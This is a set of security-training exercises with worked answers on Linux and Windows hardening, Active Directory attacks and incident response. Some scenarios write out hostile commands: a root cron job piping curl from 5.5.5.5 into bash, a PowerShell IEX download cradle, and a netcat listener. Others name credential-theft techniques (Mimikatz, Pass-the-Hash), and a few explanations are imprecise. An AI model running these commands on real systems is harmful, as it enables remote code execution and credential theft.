# Month 2 — Practice Exercises: Operating Systems Security

**25 exercises with worked answers. Attempt without notes first.**

---

## Section A: Linux Fundamentals (Questions 1-8)

**Q1.** You run `ls -la /etc/shadow` and see:
```
---------- 1 root shadow 1423 Jan 15 09:30 /etc/shadow
```
a) What do the dashes at the beginning mean?  
b) Who owns the file?  
c) What group has access?  
d) Why would a security analyst be concerned if this output were `-rw-r--r-- 1 root root`?

**Answer:**
a) `----------` means no permissions for anyone (owner, group, others — all denied). This is intentional — `shadow` is read by PAM during authentication via a kernel mechanism, not through file permissions.
b) The file owner is `root`
c) The owning group is `shadow` (but even shadow group members have no permissions — `----------`)
d) `-rw-r--r--` would mean everyone can read `/etc/shadow`, which contains hashed passwords. An attacker with any account on the system could copy the file and attempt offline password cracking (using tools like Hashcat or John the Ripper).

---

**Q2.** Explain the difference between these two commands and when you'd use each:
```bash
sudo su -
sudo -i
sudo bash
```

**Answer:** All three give you a root shell, but with subtle differences:
- `sudo su -` — starts a login shell as root (`-` means load root's full environment, `/root/.profile`, PATH etc). Most thorough environment switch.
- `sudo -i` — sudo's own "simulate initial login" flag. Similar to `sudo su -` but more portable across systems.
- `sudo bash` — starts bash as root but inherits your current user's environment (HOME, PATH from your user). Less clean — might have different PATH or env vars than a true root login.
Security relevance: attackers who escalate privileges may use different methods depending on what's available. Forensically, each leaves different process parent/child relationships and env variables.

---

**Q3.** A colleague says "I set a file's permissions to 777 so everyone can use it." What are the security implications and what should the permissions actually be for:
a) A configuration file containing database credentials  
b) An executable script that should run by all users but not be modified  
c) An SSH private key

**Answer:**
a) DB credentials config: `600` (rw-------) — only the owner (the application user) should read it. `640` if a group also needs access. Never world-readable (any user or compromised process could read credentials).
b) Executable script, read-only: `755` (rwxr-xr-x) — owner can modify, everyone can execute and read. Never `777` — the `w` bit for group/others allows anyone to modify the script (attacker could insert malicious commands).
c) SSH private key: `600` (rw-------) — SSH will actually refuse to use a key with looser permissions ("UNPROTECTED PRIVATE KEY FILE" warning). World-readable private keys allow any user on the system to copy and use your private key.

---

**Q4.** Analyse this `/etc/passwd` entry:
```
backup_svc:x:1001:1001:Backup Service:/var/backups:/bin/bash
```
List every piece of information this contains and identify two potential security concerns.

**Answer:** Fields (colon-separated):
1. `backup_svc` — username
2. `x` — password placeholder (actual hash in `/etc/shadow`)
3. `1001` — User ID (UID)
4. `1001` — Group ID (GID) — primary group
5. `Backup Service` — GECOS field (comment/description)
6. `/var/backups` — home directory
7. `/bin/bash` — login shell

**Security concerns:** (1) The shell is `/bin/bash` — a service account doing automated backups does not need an interactive shell. If this account is compromised, the attacker gets a full bash shell. Should be `/sbin/nologin` or `/bin/false`. (2) UID 1001 and GID 1001 are regular user IDs. Verify what files are owned by 1001 on the system — attackers sometimes create accounts with elevated effective permissions through group memberships.

---

**Q5.** Write a bash one-liner to find all files modified in the last 24 hours in `/var/log/` and display them sorted by modification time (newest first).

**Answer:**
```bash
find /var/log/ -mtime -1 -type f -exec ls -lt {} + 2>/dev/null | sort -k6,7 -r
```
Or more simply:
```bash
find /var/log/ -mtime -1 -type f | xargs ls -lt 2>/dev/null | head -20
```
Alternative using `stat`:
```bash
find /var/log/ -mtime -1 -type f -printf '%T@ %p\n' 2>/dev/null | sort -rn | cut -d' ' -f2-
```

Security use case: During incident response, finding recently modified log files can reveal: (1) tampering (attacker deleted log entries), (2) unusual application activity, (3) new log files created by malware.

---

**Q6.** You're doing a security audit of a Linux server and find this crontab entry:
```
* * * * * root curl http://5.5.5.5/update.sh | bash
```
What is this doing? Why is it a critical security finding? What are three indicators you should look for to determine if this is malicious?

**Answer:** This runs every minute as root, downloads a shell script from an external IP (5.5.5.5), and pipes it directly into bash for execution. This is a classic persistence and update mechanism used by malware/cryptominers.

**It's critical because:** (1) Runs as root — attacker gets maximum privilege execution every minute, (2) `curl | bash` downloads and executes arbitrary code without any verification, (3) Can change the script content at any time to execute different commands.

**Indicators of malice:**
1. Check if `5.5.5.5` is known malicious (VirusTotal, AbuseIPDB, threat intel feeds)
2. Run `curl http://5.5.5.5/update.sh` manually — what does the script do? Is it legitimate software?
3. Is this crontab entry documented in change management? Ask the system owner
4. When was this crontab entry added? (`find / -name "crontab" -mtime -30` to see recent changes)
5. Are there any unusual processes currently running that this might have started?

---

**Q7.** Explain the Linux permission model for this scenario: A web application runs as user `www-data`. Its config file `/etc/webapp/config.ini` contains database credentials. What permissions would you set on the file and directory, and what command achieves this?

**Answer:**
```bash
# Set ownership to root (owner) and www-data (group)
chown root:www-data /etc/webapp/config.ini
# Owner (root) can read/write; group (www-data) can read; others: nothing
chmod 640 /etc/webapp/config.ini

# The directory also needs to be protected
chown root:www-data /etc/webapp/
chmod 750 /etc/webapp/   # root: rwx, www-data: r-x, others: ---
```
Why not `chown www-data:www-data` (www-data owns the file)? If the web server process is compromised, the attacker has write access to the config file (could change DB credentials to point to their server). With `root:www-data 640`, www-data can only READ the config, not modify it.

---

**Q8.** You are investigating a Linux system and run `netstat -tlnp` (or `ss -tlnp`) and see:
```
tcp  0.0.0.0:4444   LISTEN  1337/nc
```
What does this tell you and what would you do next?

**Answer:** Port 4444 is listening on all interfaces (0.0.0.0), being served by process 1337 which appears to be `nc` (netcat). Port 4444 is a classic netcat/reverse shell/Metasploit default listener port. This is almost certainly a backdoor.

**Immediate steps:**
1. `ps aux | grep 1337` — get full command line
2. `ls -la /proc/1337/exe` — find the actual binary
3. `cat /proc/1337/cmdline` — see exact arguments
4. `ls -la /proc/1337/fd/` — see what files it has open
5. Check `/proc/1337/net/tcp` — see any established connections TO this port
6. Check crontabs for persistence: `crontab -l; cat /etc/crontab; ls /etc/cron.d/`
7. **Do NOT kill the process yet** — collect evidence first (forensic approach)
8. Isolate the machine from the network

---

## Section B: Windows Security (Questions 9-16)

**Q9.** Match each Windows Event ID to its security significance:
```
Event IDs: 4624, 4625, 4648, 4672, 4688, 4698, 4720, 4732
Events: 
A) Attacker creates a new admin account for persistence
B) Failed logon — brute force indicator
C) Malware spawns a new process  
D) Attacker adds their account to Domain Admins group
E) Scheduled task created for persistence
F) Admin logs in (monitor for unusual admin activity)
G) Successful logon — baseline
H) Pass-the-Hash (logon using explicit credentials)
```

**Answer:**
- 4624 → G (Successful logon — baseline)
- 4625 → B (Failed logon — brute force indicator)
- 4648 → H (Pass-the-Hash — logon using explicit credentials)
- 4672 → F (Admin logs in — special privileges assigned)
- 4688 → C (New process created — malware spawns process)
- 4698 → E (Scheduled task created for persistence)
- 4720 → A (New account created for persistence)
- 4732 → D (Member added to security group)

---

**Q10.** A Windows administrator runs this PowerShell command:
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://5.5.5.5/payload.ps1')
```
What does `IEX` do? Why is this command extremely dangerous? What should a defender look for to detect this technique?

**Answer:** `IEX` is an alias for `Invoke-Expression` — it executes a string as a PowerShell command. `DownloadString` downloads the content of a URL. Combined: this downloads a PowerShell script from a remote server and immediately executes it in memory — no file is written to disk (fileless malware technique).

**Why dangerous:** (1) Fileless — evades antivirus that scans the filesystem, (2) Executes whatever the remote server sends — attacker can update payload dynamically, (3) Often obfuscated — `IEX` disguised as `&(g`ir`it)` or base64-encoded.

**Detection:**
- Event ID 4688 (process creation) with `powershell.exe` in the command line
- PowerShell Script Block Logging (Event ID 4104) — logs the full decoded script even if obfuscated
- PowerShell Module Logging — logs loaded modules
- Network connections from PowerShell process (detect with Sysmon Event ID 3)
- AMSI (Antimalware Scan Interface) — PowerShell passes code to Windows Defender before execution

---

**Q11.** Explain Kerberoasting: what it is, how it works, why it's effective, and how to detect it.

**Answer:**
**What:** Kerberoasting extracts password hashes for service accounts that are configured with a Service Principal Name (SPN) in Active Directory, for offline cracking.

**How:** (1) Attacker gets any valid domain account (even a low-privilege user), (2) Queries AD to find all accounts with SPNs (`Get-ADUser -Filter {ServicePrincipalName -ne "$null"}`), (3) Requests a Kerberos Service Ticket (TGS) for each SPN — this is a legitimate AD operation, (4) The TGS is encrypted with the service account's password hash, (5) Attacker extracts the encrypted TGS and cracks it offline with Hashcat.

**Why effective:** (1) Requesting TGS tickets is a normal domain operation — no malware or exploitation needed, (2) Service accounts often have weak passwords (they're not human accounts; admins use simple passwords), (3) Service accounts often have high privileges.

**Detection:**
- Unusual number of TGS requests (Event ID 4769) from one account in a short period
- 4769 with encryption type 0x17 (RC4) — legitimate applications use AES (0x12/0x18)
- Honeypot SPN: create a fake service account with no real service — any TGS request for it is automatically suspicious

---

**Q12.** What is the Windows Registry? Explain: (a) what the 5 hives are, (b) what three registry keys you would check immediately during a security incident, and (c) what information is stored in `HKLM\SYSTEM\CurrentControlSet\Services`.

**Answer:**
**(a) 5 hives:**
- `HKEY_LOCAL_MACHINE (HKLM)` — machine-wide settings, all users
- `HKEY_CURRENT_USER (HKCU)` — settings for the currently logged-in user
- `HKEY_CLASSES_ROOT (HKCR)` — file type associations and COM object registrations
- `HKEY_USERS (HKU)` — profiles for all users on the machine
- `HKEY_CURRENT_CONFIG (HKCC)` — current hardware configuration

**(b) First registry keys to check in an incident:**
1. `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` — programs that autostart for all users
2. `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` — programs that autostart for current user
3. `HKLM\SYSTEM\CurrentControlSet\Services` — all installed services (malware persists as services)

**(c) HKLM\SYSTEM\CurrentControlSet\Services:** Each subkey is a Windows service. Contains: ImagePath (path to the service executable), Start (0=boot, 1=system, 2=automatic, 3=manual, 4=disabled), Type (kernel driver, service), Description. Attackers create malicious services here for persistence. Look for services with unusual names, paths pointing to `%TEMP%` or user profile directories, or recently created timestamps.

---

**Q13.** Walk through what happens on a Windows domain when a user opens Outlook to read email, focusing on the Kerberos authentication flow.

**Answer:**
1. User logs in to Windows — provides password to LSASS
2. LSASS sends AS-REQ (Authentication Service Request) to the Domain Controller's KDC, including the username
3. KDC verifies the username exists and sends back AS-REP containing a TGT (Ticket-Granting Ticket) encrypted with the domain's KRBTGT hash. The TGT contains the user's identity, privileges, and a session key
4. LSASS decrypts the AS-REP using the user's password hash and stores the TGT
5. User opens Outlook — Outlook needs to connect to the Exchange server (say `mail.corp.local`)
6. LSASS sends TGS-REQ to the KDC: "I have this TGT, please give me a service ticket for the Exchange service SPN"
7. KDC validates the TGT and returns a TGS (service ticket) encrypted with the Exchange service account's hash
8. Outlook sends the TGS to the Exchange server. Exchange decrypts it with its own hash, verifies the user's identity, and grants access
9. User's email loads — no password prompt because Kerberos handled it transparently

---

**Q14.** What is LSASS and why is it a primary target for attackers? What does Mimikatz do when run against LSASS?

**Answer:** LSASS (Local Security Authority Subsystem Service) is the Windows process that handles authentication — it validates passwords for local logins, stores credentials for SSO, and manages Kerberos tickets and NTLM hashes in memory.

Attackers target LSASS because it holds: plaintext credentials (in older configurations or with WDigest enabled), NTLM password hashes (usable for Pass-the-Hash), and Kerberos tickets (usable for Pass-the-Ticket).

Mimikatz (`sekurlsa::logonpasswords`) injects into or reads LSASS memory to extract these credentials. In Windows XP/2003, it could extract plaintext passwords directly. Modern Windows (8.1+) with Protected LSASS (PPL) and Credential Guard makes this harder.

**Defences:** Enable Windows Credential Guard (requires TPM 2.0), enable LSA Protection (PPL), disable WDigest authentication (`HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential = 0`), monitor for process access to LSASS (Sysmon Event ID 10).

---

**Q15.** Design the Group Policy settings for a company of 500 employees. Include at least 8 specific GPO settings and explain what each enforces.

**Answer:**

| GPO Setting | Policy Path | What it enforces |
|------------|------------|----------------|
| Password minimum length: 14 | Computer Config → Security Settings → Account Policies | Prevents short passwords from being guessed/cracked easily |
| Password complexity: enabled | Computer Config → Security Settings → Account Policies | Requires uppercase, lowercase, numbers, symbols |
| Account lockout: 5 attempts | Computer Config → Security Settings → Account Lockout | Stops brute force attacks on AD accounts |
| Disable PowerShell v2 | Computer Config → Admin Templates → Windows Components | PS v2 bypasses script block logging and AMSI |
| Enable PowerShell Script Block Logging | Computer Config → Admin Templates → Windows Components → PowerShell | Logs all PS commands for forensics |
| Restrict USB storage | Computer Config → Admin Templates → System → Removable Storage | Prevents data theft via USB drives |
| AppLocker: whitelist allowed executables | Computer Config → Security Settings → Application Control Policies | Prevents unauthorised applications from running |
| Disable SMBv1 | Computer Config → Admin Templates → Network → Lanman Workstation | Removes EternalBlue/WannaCry attack surface |
| Windows Defender: Real-time protection enabled | Computer Config → Admin Templates → Windows Defender | Ensures AV is always active and cannot be disabled by users |
| Screen lock after 15 minutes | Computer Config → Admin Templates → Control Panel → Personalization | Prevents unauthorised access to unlocked workstations |

---

**Q16.** What is a Golden Ticket attack in Active Directory? What does the attacker need to execute it, and why is it called "golden"?

**Answer:** A Golden Ticket is a forged Kerberos TGT (Ticket-Granting Ticket) created by an attacker using the KRBTGT account's password hash. Because all Kerberos tickets in the domain are validated against the KRBTGT hash, a forged TGT with the correct KRBTGT hash will be accepted by every Domain Controller as legitimate.

**What attacker needs:** The KRBTGT account's NTLM hash (requires Domain Admin access first — DCSync attack or physical DC access) and any user's SID.

**Why "golden":** The forged ticket can: grant access to ANY resource in the domain, be created for any user including non-existent users, have an expiry set to any date (attackers set 10-year validity), persist even if the original user's password changes. It essentially provides permanent, unlimited domain access.

**Detection & Response:** Extremely difficult to detect because the tickets look valid. Key indicators: tickets with anomalous expiry times (>10 hours), tickets for users with no corresponding logon event, or Event 4769 with unusual service names. **Response:** The only real fix is changing the KRBTGT password TWICE (invalidates all existing tickets), which causes a brief disruption — Microsoft has a script (`New-KrbtgtKeys.ps1`) to do this safely.

---

## Section C: Incident Investigation Scenarios (Questions 17-20)

**Q17.** You receive an alert: "Multiple failed logon attempts to the domain followed by a successful logon from IP 185.220.101.100". Walk through your complete investigation.

**Answer:**
1. **Identify the account:** What username was targeted? Is it a privileged account (Domain Admin, service account)?
2. **Volume and timing:** How many failures? Over what time period? Pattern (every 2 seconds = automated brute force)?
3. **Source IP intel:** Check 185.220.101.100 on VirusTotal, AbuseIPDB, Shodan. Is it a known Tor exit node? Known attacker infrastructure?
4. **Successful logon analysis (Event 4624):** What logon type? (Type 3 = network = remote access; Type 10 = RemoteInteractive = RDP). What authentication package (NTLM/Kerberos)?
5. **Post-logon activity:** After the successful 4624, what did this account do? Event 4688 (new processes), 4663 (object access), 4698 (scheduled task created)?
6. **Scope check:** Did the IP attempt other accounts? Other hosts? (SIEM pivot on source IP)
7. **Action:** If confirmed malicious — block the IP at firewall, disable the compromised account, force password reset on any account the IP touched, escalate to IR team

---

**Q18.** A junior analyst asks you: "What's the difference between a local user account and a domain user account in Windows? Why does it matter for security?"

**Answer:** **Local account:** stored in the Windows Security Account Manager (SAM) database on the local machine only. Credentials valid only on that machine. Example: `WORKSTATION\localadmin`. If you get their hash, it works only on that machine.

**Domain account:** stored in Active Directory on Domain Controllers. Credentials work on any machine joined to the domain. Example: `CORP\john.smith`. Kerberos manages authentication centrally.

**Why it matters for security:**
1. **Credential reuse:** If a domain account is compromised, the attacker can access every resource in the domain that account has permissions for — one breach, many machines.
2. **Pass-the-Hash scope:** An NTLM hash for a local admin account (with same password across machines — "local admin reuse") enables lateral movement. Domain account hash works across the entire domain.
3. **Centralised management:** Domain accounts can have GPO restrictions, forced password changes, account lockouts enforced centrally. Local accounts bypass many of these controls.
4. **The Local Admin Password Solution (LAPS):** Microsoft's tool to randomise local admin passwords per machine — prevents one compromised machine from unlocking all others via shared local admin hash.

---

**Q19.** You are doing forensic investigation of a Linux server that may have been compromised. List the first 10 commands you run and explain what each one tells you.

**Answer:**
```bash
1. w                              # Who is currently logged in? Any unexpected live sessions?
2. ps auxf                        # All processes with parent/child tree — find unusual processes
3. netstat -tlnp / ss -tlnp       # What is listening? Any unexpected backdoors?
4. netstat -tnp state established # Active connections — any beaconing to external IPs?
5. last -20                       # Recent login history — when did the compromise start?
6. cat /var/log/auth.log | grep "Accepted\|Failed" | tail -30  # Authentication events
7. find / -mtime -7 -type f -not -path "/proc/*" 2>/dev/null   # Files changed in last 7 days
8. crontab -l; cat /etc/crontab   # Persistence via cron?
9. find / -perm -4000 2>/dev/null  # SUID binaries — any new ones added?
10. cat /etc/passwd | grep -v nologin | grep -v false  # User accounts with shells — any new ones?
```

---

**Q20.** Explain what LAPS (Local Administrator Password Solution) is, why it's needed, and what happens without it.

**Answer:** LAPS is a Microsoft solution that automatically randomises the local administrator password on every Windows machine in a domain and stores the password in Active Directory (accessible only to authorised admins).

**Why needed:** By default, when Windows machines are joined to a domain, they often have the same local admin password (set during imaging/deployment). This is standard IT practice — one password image for hundreds of machines.

**Without LAPS:** If an attacker compromises one machine and extracts the local admin NTLM hash, they can use Pass-the-Hash against every other machine in the domain with the same local admin password — a single breach becomes a domain-wide compromise. This is exactly how many ransomware attacks spread laterally.

**With LAPS:** Each machine has a unique, randomly generated local admin password, stored encrypted in AD and visible only to domain admins (or delegated OUs). Pass-the-Hash of one machine's local admin hash is useless against any other machine.

---

## Section D: Design Questions (Questions 21-25)

**Q21.** Design a secure Linux baseline configuration for a new web server. List 10 specific hardening actions with the commands to implement them.

**Answer:**
```bash
# 1. Update all packages
apt update && apt upgrade -y

# 2. Install and configure UFW firewall
ufw default deny incoming
ufw default allow outgoing
ufw allow 443/tcp  # HTTPS
ufw allow from 10.0.1.0/24 to any port 22  # SSH from admin net only
ufw enable

# 3. Disable root SSH login
sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config
sed -i 's/#PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config
systemctl restart ssh

# 4. Install and configure Fail2ban
apt install fail2ban -y
# Creates /etc/fail2ban/jail.local with SSH protection

# 5. Enable automatic security updates
apt install unattended-upgrades -y
dpkg-reconfigure -plow unattended-upgrades

# 6. Configure auditd for file integrity monitoring
apt install auditd -y
auditctl -w /etc/passwd -p wa -k password-file
auditctl -w /etc/shadow -p wa -k shadow-file
auditctl -w /var/www/ -p wa -k webroot-changes

# 7. Disable unused services
systemctl disable avahi-daemon
systemctl disable cups
systemctl stop avahi-daemon cups

# 8. Mount /tmp with noexec
# Add to /etc/fstab: tmpfs /tmp tmpfs defaults,noexec,nosuid 0 0
mount -o remount,noexec /tmp

# 9. Set UMASK to 027 (files created as 640, dirs as 750)
echo "UMASK 027" >> /etc/login.defs

# 10. Install and run Lynis security auditor
apt install lynis -y
lynis audit system  # Gives score and specific recommendations
```

---

**Q22.** What is Pass-the-Hash (PtH)? Draw the attack flow and explain what makes it possible at the protocol level.

**Answer:** Pass-the-Hash exploits NTLM authentication's design: NTLM uses the password hash directly as the authentication secret — the cleartext password itself is never sent or needed by the authentication protocol.

**Attack flow:**
```
1. Attacker compromises Machine A
2. Dumps LSASS memory on Machine A → gets NTLM hash of user "jsmith"
3. Attacker uses Mimikatz's "pth" module or Impacket's "smbclient.py -hashes"
   with jsmith's NTLM hash
4. Authentication attempt to Machine B:
   [Attacker] → Machine B: "I'm jsmith" (NTLM Challenge request)
   [Machine B] → Attacker: "Here's a challenge" (random nonce)
   [Attacker] → Machine B: NTLM_Response = HMAC-MD5(hash, challenge)
   (Attacker used the hash directly to compute the response — no password needed)
5. Machine B accepts authentication — attacker is now jsmith on Machine B
```

**What makes it possible:** NTLM's challenge-response doesn't require the plaintext password — only the hash. This is a fundamental protocol design decision (avoids sending passwords over the network), but it means "knowing the hash" is equivalent to "knowing the password."

**Mitigations:** Enable Windows Defender Credential Guard (prevents hash extraction from LSASS), enforce Kerberos over NTLM where possible, implement network segmentation to limit SMB lateral movement.

---

**Q23.** Write a PowerShell script that audits a Windows system and produces a security report including: logged-in users, running processes connecting to external IPs, and recently created local user accounts.

**Answer:**
```powershell
# Security Audit Script
$report = @()
$report += "=== SECURITY AUDIT REPORT ==="
$report += "Generated: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
$report += "Hostname: $env:COMPUTERNAME"
$report += ""

# Section 1: Currently logged-in users
$report += "=== LOGGED-IN USERS ==="
(query user 2>$null) | ForEach-Object { $report += $_ }
$report += ""

# Section 2: Processes with external network connections
$report += "=== PROCESSES WITH EXTERNAL CONNECTIONS ==="
$connections = Get-NetTCPConnection -State Established | 
  Where-Object { $_.RemoteAddress -notmatch '^(127\.|10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)' }
foreach ($conn in $connections) {
    try {
        $proc = Get-Process -Id $conn.OwningProcess -ErrorAction SilentlyContinue
        $report += "$($proc.Name) (PID $($conn.OwningProcess)) → $($conn.RemoteAddress):$($conn.RemotePort)"
    } catch { }
}
$report += ""

# Section 3: Recently created local user accounts (last 30 days)
$report += "=== RECENTLY CREATED LOCAL ACCOUNTS (last 30 days) ==="
$cutoff = (Get-Date).AddDays(-30)
Get-LocalUser | Where-Object { $_.CreatedDate -gt $cutoff } | 
  ForEach-Object { $report += "User: $($_.Name) Created: $($_.CreatedDate) Enabled: $($_.Enabled)" }
$report += ""

# Output
$report | Tee-Object -FilePath "C:\temp\security_audit_$(Get-Date -Format 'yyyyMMdd').txt"
```

---

**Q24.** Explain what happens when you type `cmd.exe /c "powershell.exe -encodedcommand JABjAG0AZAAgAD0AIgBpAHAAYwBvAG4AZgAiAA=="` in Windows. Why do attackers use encoded commands and how do defenders decode them?

**Answer:** This runs PowerShell with a Base64-encoded command (`-encodedcommand`). The Base64 string decodes to `$cmd = "ipconfig"` — in this case harmless, but attackers use the same technique with malicious payloads.

**Why attackers use it:** (1) Bypasses simple keyword detection ("powershell.exe -nop -c Invoke-Mimikatz" triggers AV, but encoded form does not), (2) Hides the intent from casual log inspection, (3) Special characters in shell commands (quotes, pipes) can be URL/base64-encoded to avoid parsing issues.

**How defenders decode:**
```powershell
# Decode in PowerShell
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('JABjAG0AZAAgAD0AIgBpAHAAYwBvAG4AZgAiAA=='))
# Output: $cmd = "ipconfig"
```

**Detection:** Enable PowerShell Script Block Logging (Event ID 4104) — Windows automatically decodes and logs the actual command even when `-encodedcommand` is used. AMSI also passes the decoded script to antivirus before execution.

---

**Q25.** You are designing security monitoring for an Active Directory environment. List 10 specific AD events you would alert on and explain the threat each indicates.

**Answer:**

| Event | Alert Condition | Threat |
|-------|----------------|--------|
| 4625 + 4624 (same source) | >20 failures then success within 5 min | Brute force succeeded — account compromise |
| 4769 (Kerberos TGS request) | Encryption type 0x17 (RC4) | Kerberoasting attempt |
| 4624 (logon) | Type 3 (network) from non-business-hours IP | Potential attacker or stolen credentials |
| 4698 (scheduled task created) | Any task created pointing to `%TEMP%` or user profile | Malware persistence |
| 4720 (account created) | New account creation outside change window | Attacker creating backdoor account |
| 4732 (group membership) | Any addition to Domain Admins, Enterprise Admins | Privilege escalation |
| 4672 + 4624 | Admin logon from workstation (not server/DC) | Admin credentials used on inappropriate endpoint |
| 7045 (service installed) | Service path points to temp directory | Malware service installation |
| 4648 (explicit credentials) | Different account than the session user | Pass-the-Hash / credential theft |
| 4776 (NTLM validation) | NTLM auth to DC from internet-facing hosts | NTLM relay attack |
